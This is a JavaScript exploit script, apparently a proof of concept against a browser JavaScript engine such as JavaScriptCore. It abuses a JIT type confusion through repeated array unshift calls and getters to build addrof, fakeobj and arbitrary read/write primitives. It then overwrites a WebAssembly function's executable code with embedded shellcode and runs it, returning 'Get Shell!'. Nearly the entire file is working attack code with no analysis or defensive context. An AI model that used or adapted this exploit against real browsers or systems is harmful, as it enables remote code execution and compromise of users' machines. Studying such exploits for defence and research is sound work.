// Version 609.2.9.1.2
function hex(a, b) {
    if (!b)
        return "0x" + a.toString(16);
    else
        return "0x" + a.toString(16) + b.toString(16).padStart(8, '0');
}
function gcc() {
    for (let i = 0; i < 10; i++) {
        let ab = new ArrayBuffer(1024 * 1024 * 10);
    }
}

let ab = new ArrayBuffer(0x10);
let u8a = new Uint8Array(ab);
let u32a = new Uint32Array(ab);
let f64a = new Float64Array(ab);

let o = new Object();
o[0] = this;
o[1] = ab;
o[2] = o;

function yf1() {
    arr1.unshift(1);
    arr1.unshift(1);
    return [1.1, 2.2];
}
function yf2() {
    arr2.unshift(1);
    arr2.unshift(1);
    return [1.1, 2.2];
}

let arr1 = Array();
let arr2 = Array();
let res = 0;

function outer1(arr) {
    arr.unshift(10086);
    arr.y = 1;
}
function outer2(arr) {
    arr.unshift(10086);
    res = arr.y;
}

const shellcode = [1.27444706462e-314,3.95778716348e-315,9.15207288818e-315,7.24529000561e-315,4.08506608246e-315,5.96898456543e-315,1.46019266125e-314,1.19378645421e-314];
let af = [2.0965535924407288e-303];
let dummy = [];
dummy.__proto__ = {
    [Symbol.toPrimitive]() {
        evil = this
        u32a[1] = 0x01001700;
        af[0] = f64a[0];
        evil[0] = 5.40900888e-315;
        evil.prop = 1.1;
        doubleObjectMap = af[0];
        evil[1] = {a:1, b:2};
        normalObjectMap = af[0];
        butterfly = af[1];

        function addrof(o) {
            af[0] = normalObjectMap;
            evil[0] = o;
            af[0] = doubleObjectMap;
            f64a[0] = evil[0];
            return f64a[0];
        }
        function fakeobj(addr1, addr2=0) {
            af[0] = doubleObjectMap;
            u32a[0] = addr1;
            u32a[1] = addr2;
            evil[0] = f64a[0];
            af[0] = normalObjectMap;
            return evil[0];
        }
        function read64(addr) {
            af[0] = doubleObjectMap;
            f64a[0] = addr;
            u32a[0] += 0x18;
            af[1] = f64a[0];
            let res = evil.prop;
            af[1] = butterfly;
            return res;
        }
        function write64(addr, val) {
            // val = fakeobj(val);
            af[0] = doubleObjectMap;
            f64a[0] = addr;
            u32a[0] += 0x18;
            af[1] = f64a[0];
            evil.prop = val;
            af[1] = butterfly;
        }
        function write(addr, shellcode) {
            for (let i = 0; i < shellcode.length; i++) {
                f64a[0] = addr; u32a[0] += i;
                write64(f64a[0], shellcode[i].charCodeAt());
            }
        }
        function writesc(addr, shellcode) {
            for (let i = 0; i < shellcode.length; i++) {
                f64a[0] = addr; u32a[0] += i * 4;
                write64(f64a[0], shellcode[i]);
            }
        }

        function pwn() {
            let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
            let wasm_mod = new WebAssembly.Module(wasm_code);
            let wasm_instance = new WebAssembly.Instance(wasm_mod);
            let f = wasm_instance.exports.main;
            let addr_f = addrof(f);
            u32a[0] += 0x38;
            let addr_p = read64(f64a[0]);
            let addr_shellcode = read64(addrof(addr_p));
            writesc(addrof(addr_shellcode), shellcode);
            f();
        }
        pwn();
        return "Get Shell!";
    }
}
dummy.a = {};
gcc();

function main() {
    arr1.a = af;
    arr1.b = af;
    arr1.c = af;
    arr1.d = af;
    arr1.__defineGetter__('y', yf1);
    arr1.__defineSetter__('y', yf1);

    for (let i = 0; i < 0x18000; i++) {
        arr1.unshift(0);
    }
    try {
        for (let i = 0; i < 0x20000; i++) {
            outer1(arr1);
        }
    } catch(e) {
        let msg = e.message;
        f64a[0] = parseFloat(msg.slice(0, msg.indexOf(' ')));
    }
    // u32a[1] = 0x01170100;
    u8a[5] = 18;
}

main();

if (!u32a[1]) exit(0)

af[0] = f64a[0];
af[1] = 0;

function main1() {
    arr2.a = af;
    arr2.b = af;
    arr2.c = af;
    arr2.d = af;
    arr2.__defineGetter__('y', yf2);
    arr2.__defineSetter__('y', yf2);
    for (let i = 0; i < 0x18000; i++) {
        arr2.unshift(0);
    }
    try {
        for (let i = 0; i < 0x20000; i++) {
            outer2(arr2);
        }
    } catch(e) {
        let msg = e.message;
    }
}

main1();
